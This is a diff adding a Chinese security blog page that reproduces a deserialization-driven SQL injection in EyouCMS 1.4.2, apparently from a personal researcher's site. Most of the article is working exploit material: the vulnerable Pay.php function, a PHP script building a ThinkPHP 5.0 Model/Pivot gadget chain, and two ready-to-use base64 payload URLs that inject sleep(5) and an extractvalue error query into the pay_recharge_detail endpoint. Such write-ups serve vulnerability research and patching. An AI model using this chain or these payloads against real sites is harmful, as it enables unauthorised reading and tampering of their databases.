@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Eyoucms 1.4.2 sql注入一、漏洞简介二、漏洞影响三、复现过程介绍漏洞之前先了解下这套CMS，EyouCms是基于TP5.0（5.0.24）框架为核心开发的免费+开源的企业内容管理系统。 Payload: http:&#x2F;&#x2F;0-sec.org&#x2F;index.php?m&#x3D;user&amp;c&#x3D;pay&amp;a&#x3D;pay_recharge_detail&amp;querystr&#x3D;YToyOntz">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.4.2%20sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Eyoucms 1.4.2 sql注入一、漏洞简介二、漏洞影响三、复现过程介绍漏洞之前先了解下这套CMS，EyouCms是基于TP5.0（5.0.24）框架为核心开发的免费+开源的企业内容管理系统。 Payload: http:&#x2F;&#x2F;0-sec.org&#x2F;index.php?m&#x3D;user&amp;c&#x3D;pay&amp;a&#x3D;pay_recharge_detail&amp;querystr&#x3D;YToyOntz">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Eyoucms1.4.2sql%E6%B3%A8%E5%85%A5/media/rId24.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Eyoucms1.4.2sql%E6%B3%A8%E5%85%A5/media/rId25.png">
+<meta property="article:published_time" content="2022-07-08T06:25:55.961Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.674Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Eyoucms1.4.2sql%E6%B3%A8%E5%85%A5/media/rId24.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Eyoucms/Eyoucms 1.4.2 sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.2%20sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.961Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Eyoucms-1-4-2-sql注入"><a href="#Eyoucms-1-4-2-sql注入" class="headerlink" title="Eyoucms 1.4.2 sql注入"></a>Eyoucms 1.4.2 sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>介绍漏洞之前先了解下这套CMS，EyouCms是基于TP5.0（5.0.24）框架为核心开发的免费+开源的企业内容管理系统。</p>
+<p>Payload:</p>
+<pre><code>http://0-sec.org/index.php?m=user&amp;c=pay&amp;a=pay_recharge_detail&amp;querystr=YToyOntzOjc6Im1vbmV5aWQiO2k6MTtzOjEyOiJvcmRlcl9udW1iZXIiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo4OntzOjk6IgAqAGFwcGVuZCI7YToxOntzOjQ6InZhYWEiO3M6NDoic2F2ZSI7fXM6NzoiACoAZGF0YSI7YToxOntzOjg6InVzZXJuYW1lIjtzOjg6ImFzZGEyMTIyIjt9czo5OiIAKgBpbnNlcnQiO2E6MDp7fXM6NToiACoAcGsiO3M6NToidXNlcnMiO3M6ODoiACoAZmllbGQiO2E6Mjp7aTowO3M6ODoidXNlcnNfaWQiO2k6MTtzOjg6InVzZXJuYW1lIjt9czo4OiIAKgB0YWJsZSI7czo4OiJleV91c2VycyI7czoxMToiACoAaXNVcGRhdGUiO2I6MTtzOjE0OiIAKgB1cGRhdGVXaGVyZSI7czoyNzoidXNlcnNfaWQgPSA1KSBhbmQgc2xlZXAoNSkjIjt9fQ==
+</code></pre>
+<p>漏洞文件：/EyouCMS-V1.4.2-UTF8-SP2/application/user/controller/Pay.php</p>
+<p>漏洞函数：pay_recharge_detail</p>
+<pre><code>public function pay_recharge_detail()
+&#123;
+    $querystr   = input(&#39;param.querystr/s&#39;);
+    $querydata  = unserialize(base64_decode($querystr));
+
+    if (!empty($querydata[&#39;moneyid&#39;]) &amp;&amp; !empty($querydata[&#39;order_number&#39;])) &#123;
+</code></pre>
+<p>这莫非是？？？没错就是反序列化导致的漏洞（这里标题写了sql注入，其实更准确说应该是增删改查漏洞，如果需要再具体一点那就是THINKPHP反序列化增删改查漏洞）。这里只报错来测试下sql注入</p>
+<p>经测试，上述的payload无法执行，因为框架源码替换了</p>
+<pre><code>public function __call($method, $args)
+&#123;
+    if (array_key_exists($method, self::$hook)) &#123;
+        array_unshift($args, $this);
+        return call_user_func_array(self::$hook[$method], $args);
+    &#125; else &#123;
+        throw new Exception(&#39;method not exists:&#39; . __CLASS__ . &#39;-&gt;&#39; . $method);
+    &#125;
+&#125;
+</code></pre>
+<p>先说一下我们的反序列化利用点，到后面会调用__toString函数。而我们这里就可以跳过构造think\process\pipes\Windows<br>类。直接去构造继承Model类的子类。流程如下：</p>
+<p><img src="/resource/Eyoucms1.4.2sql%E6%B3%A8%E5%85%A5/media/rId24.png"></p>
+<p>toArray()代码在这（一部分）</p>
+<pre><code>if (!empty($this-&gt;append)) &#123;
+    foreach ($this-&gt;append as $key =&gt; $name) &#123;
+        if (is_array($name)) &#123;
+            // 追加关联对象属性
+            $relation   = $this-&gt;getAttr($key);
+            $item[$key] = $relation-&gt;append($name)-&gt;toArray();
+        &#125; elseif (strpos($name, &#39;.&#39;)) &#123;
+            list($key, $attr) = explode(&#39;.&#39;, $name);
+            // 追加关联对象属性
+            $relation   = $this-&gt;getAttr($key);
+            $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();
+        &#125; else &#123;
+            $relation = Loader::parseName($name, 1, false);
+            if (method_exists($this, $relation)) &#123;
+                $modelRelation = $this-&gt;$relation();       //我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点
+                $value         = $this-&gt;getRelationData($modelRelation);
+
+                if (method_exists($modelRelation, &#39;getBindAttr&#39;)) &#123;
+                    $bindAttr = $modelRelation-&gt;getBindAttr();
+                    if ($bindAttr) &#123;
+                        foreach ($bindAttr as $key =&gt; $attr) &#123;
+                            $key = is_numeric($key) ? $attr : $key;
+                            if (isset($this-&gt;data[$key])) &#123;
+                                throw new Exception(&#39;bind attr has exists:&#39; . $key);
+                            &#125; else &#123;
+                                $item[$key] = $value ? $value-&gt;getAttr($attr) : null;
+                            &#125;
+                        &#125;
+                        continue;
+                    &#125;
+                &#125;
+                $item[$name] = $value;
+            &#125; else &#123;
+                $item[$name] = $this-&gt;getAttr($name);
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>心细的小伙伴可能发现了</p>
+<pre><code>$this-&gt;$relation();
+</code></pre>
+<p>呸是个人都能发现好不嘞。这里可以调用当前类下所有方法。而数据库增删改查操作也是定义在Model类下。可以忽略parseName函数（无影响），但如果你非要看，呸，我就是不给你看。</p>
+<p>首先append属性是我们可以控制的。我们只需要构造append让他进入else分支就够了。然后我们就可以执行相应的数据库操作函数。save、delete、update等。</p>
+<p>构造利用链：</p>
+<pre><code>&lt;?php
+namespace think;
+abstract class Model&#123;
+    protected $append = [];
+    protected $data = [];
+    protected $insert = [];
+    protected $pk;
+    protected $field = [];
+    protected $table;
+    protected $isUpdate = false;
+    protected $updateWhere;
+    function __construct()&#123;
+        $this-&gt;append = [&quot;vaaa&quot;=&gt;&quot;save&quot;];
+        $this-&gt;data = [&quot;username&quot;=&gt;&quot;asda2122&quot;];
+        $this-&gt;pk = &quot;users&quot;;
+        $this-&gt;table = &quot;ey_users&quot;;
+        $this-&gt;field = [&#39;users_id&#39;,&#39;username&#39;];
+        $this-&gt;isUpdate = true;
+        $this-&gt;updateWhere = &quot;users_id = 5) and (extractvalue(1,concat(0x5c,(select user()))))#&quot;;
+    &#125;
+&#125;
+
+namespace think\model;
+use think\Model;
+class Pivot extends Model
+&#123;
+&#125;
+
+
+use think\model\Pivot;
+$arr[&#39;moneyid&#39;] = 1;
+$arr[&#39;order_number&#39;] = new Pivot;
+echo base64_encode(serialize($arr));
+?&gt;
+</code></pre>
+<p>生成Payload：</p>
+<pre><code>http://0-sec.org/index.php?m=user&amp;c=pay&amp;a=pay_recharge_detail&amp;querystr=YToyOntzOjc6Im1vbmV5aWQiO2k6MTtzOjEyOiJvcmRlcl9udW1iZXIiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo4OntzOjk6IgAqAGFwcGVuZCI7YToxOntzOjQ6InZhYWEiO3M6NDoic2F2ZSI7fXM6NzoiACoAZGF0YSI7YToxOntzOjg6InVzZXJuYW1lIjtzOjg6ImFzZGEyMTIyIjt9czo5OiIAKgBpbnNlcnQiO2E6MDp7fXM6NToiACoAcGsiO3M6NToidXNlcnMiO3M6ODoiACoAZmllbGQiO2E6Mjp7aTowO3M6ODoidXNlcnNfaWQiO2k6MTtzOjg6InVzZXJuYW1lIjt9czo4OiIAKgB0YWJsZSI7czo4OiJleV91c2VycyI7czoxMToiACoAaXNVcGRhdGUiO2I6MTtzOjE0OiIAKgB1cGRhdGVXaGVyZSI7czo2NToidXNlcnNfaWQgPSA1KSBhbmQgKGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDVjLChzZWxlY3QgdXNlcigpKSkpKSMiO319
+</code></pre>
+<p><img src="/resource/Eyoucms1.4.2sql%E6%B3%A8%E5%85%A5/media/rId25.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.4.2%20sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qonx006ky8v1cdl9cm7f" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.2%20%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.1%20%E5%89%8D%E5%8F%B0rce/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
